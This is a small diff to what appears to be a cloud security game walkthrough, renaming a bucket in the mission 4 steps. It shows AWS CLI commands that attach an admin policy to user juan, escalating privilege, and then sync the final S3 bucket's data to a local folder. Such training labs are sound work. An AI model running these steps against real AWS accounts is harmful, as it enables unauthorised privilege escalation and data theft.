@@ -102,7 +102,7 @@ $  `aws iam put-user-policy --user-name $juan_name --policy-name admin --policy-
 Since the instance may put user policies, update the user policy of user juan with the admin policy.
 
 
-$ `aws --profile juan s3 ls; aws --profile juan s3 sync s3://secgame-mission4-final-s3-$id ./bucket-data`
+$ `aws --profile juan s3 ls; aws --profile juan s3 sync s3://sauercloud-mission4-final-s3-$id ./bucket-data`
 
 Download the data in the final bucket.
 
